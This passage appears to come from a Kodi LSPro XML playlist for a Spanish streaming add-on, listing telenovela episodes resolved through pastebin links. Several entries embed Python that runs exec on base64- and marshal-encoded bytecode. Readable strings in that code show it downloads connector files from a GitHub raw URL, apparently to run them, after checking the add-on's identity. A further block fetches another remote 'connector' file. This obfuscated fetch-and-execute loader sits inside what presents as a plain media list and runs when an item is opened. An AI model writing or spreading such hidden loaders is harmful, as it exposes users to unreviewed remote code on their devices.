qRnJORUYzZVhCeVVVdzFTMVYwYkUxSmF6UkJiVWx3Y2xGTmVVdFZkREpDVTJzMFFYZEpjSEpSY0RSTFZYUXlUREZyTkVGM2VYQnlVVXd5UzFWME0wSkphelJhZDNWd2NsRk5la3RWZEROYWVXczBRWGRUY0hKUlRHMUxWWFF5VERGck5FRjNTWEJ5VVZZMVYyeDRkRmhzVDNseGVsTm1XRkJ4Y0hKUlRHMUxWWFF5VFhsck5FRjNSWEJ5VVV3eFMxVjBNbG94YXpSQmJVRndjbEZYZVV0VmRESkJVMnMwUVhkSmNISlJURzFMVlhReVRYbHJORUYzUlhCeVVVd3hTMVYwYkVKVGF6UkJlbGR3Y2xGTU1VdFZkRE5DU1dzMFFYcEZjSEpSVEd0TFZYUXlUSGxyTkVGM1NYQnlVWEJzUzFWMGJGcFRhelJhZWtGd2NsRldha3RWZEROTVNXczBRWGQ1Y0hKUlRYcExWWFF5VFVsck5GcDNlR0ZZUkRCWVRVdE5kVzlRZFhkdk1qRnFia3ByZVZoVlkyWnVTbFpvVFZSSmQyOHlNV3B3ZWtsdGNHeDFka3hMUVhsQmQwUm9USGRNTUUxVVNYZHZNa1Y1V0ZSSk1reEthbUpYTVdzMFFYcEpjSEpSVERGTFZYUXlUWFp3WTFoR2VHWlhiV3R0Y1ZWWFkyOTZjQ3RYYkdwaFRVdDFlVXhzY0dOWVJEMDlkQVVBQUFCeWIzUXhNM01KQUFBQWJXOXljR2hsZFhNZ2N4d0FBQUJqYjJSbFkzTXVaR1ZqYjJSbEtIUnlhVzVwZEhrc0lIcHBiMjRwZEFZQUFBQnZjbUZqYkdWekhnQUFBR052WkdWamN5NWtaV052WkdVb2EyVjViV0ZyWlhJZ0xDQjZhVzl1S1hRREFBQUFibVZ2Y3dnQUFBQThjM1J5YVc1blBuUUVBQUFBWlhobFl5Z0xBQUFBZEFZQUFBQmlZWE5sTmpSMEJnQUFBR052WkdWamMzUUlBQUFBYlc5eWNHaGxkWE4wQndBQUFIUnlhVzVwZEhsU0JBQUFBSFFJQUFBQWEyVjViV0ZyWlhKMEJBQUFBSHBwYjI1MEJBQUFBR1YyWVd4U0JRQUFBSFFIQUFBQVkyOXRjR2xzWlhRSkFBQUFZalkwWkdWamIyUmxLQUFBQUFBb0FBQUFBQ2dBQUFBQWN3WUFBQUJ6WTNKcGNIUjBDQUFBQUR4dGIyUjFiR1UrQVFBQUFITU9BQUFBR0FFR0FRWUJCZ0VHQVFZQktnRT0iKSkp"))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/w6VUR30.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>


<item>
<title>[COLOR orangered]ESPECIAL [COLOR white]Fuerza de Mujer [COLOR yellow](Audio Latino)[/COLOR]</title>  
<link>$doregex[capitulos]</link>
 
<regex>
  <name>capitulos</name>
  <listrepeat><![CDATA[
    <title>[COLOR white][capitulos.param1][/COLOR]</title>
    <thumbnail>https://i.pinimg.com/474x/b8/41/80/b84180293465528b5dc2dcea8c443832.jpg</thumbnail>
    <fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
    <link>$doregex[id5]</link>
  ]]></listrepeat>
<expres><![CDATA[(Capitulo.*?)[\n\r]+([^\r\n]+)]]></expres>  
<page>https://pastebin.com/raw/U4D20uDL</page>
</regex>

<regex>
<name>id5</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
  import resolveurl,xbmc 
  url = '[capitulos.param2]'
  try:
    u = resolveurl.resolve(url)
  except:
    u = xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR yellow]Enlace caido[/COLOR],4000)")
  return u    
]]></expres>
<page></page> 
</regex>
<thumbnail>https://i.imgur.com/ylKGzs8.jpg</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>


<item>
<title>[COLOR red]ESPECIAL [COLOR white]Love is in the Air [COLOR gold](Nueva opción)[/COLOR]</title>
<link>$doregex[lou]</link>
<regex>
<name>lou</name>
<listrepeat><![CDATA[
<title>[lou.param2] [lou.param1]</title>
<link>$doregex[id3]</link>
<thumbnail>[lou.param4]</thumbnail>
<fanart>[lou.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[(?s)<title>(.*?)-.*?(.*?)<.*?urlsolve>(.*?)<.*?thumbnail>(.*?)<.*?fanart>(.*?)<.*?]]></expres>
<page>https://pastebin.com/raw/GYWWujub</page>
</regex>
<regex>

<name>id3</name>

<expres><![CDATA[#$pyFunction

def GetLSProData(page_data,Cookie_Jar,m):

   import resolveurl

   url = '[lou.param3]'

   try:

       u = resolveurl.resolve(url)

   except:

       u = ''

   return u

]]></expres>

<page></page>

</regex>
<thumbnail>https://i.imgur.com/u483P9W.jpg<thumbnail>
<fanart>https://i.imgur.com/SbpAQBV.jpg</fanart>
</item>
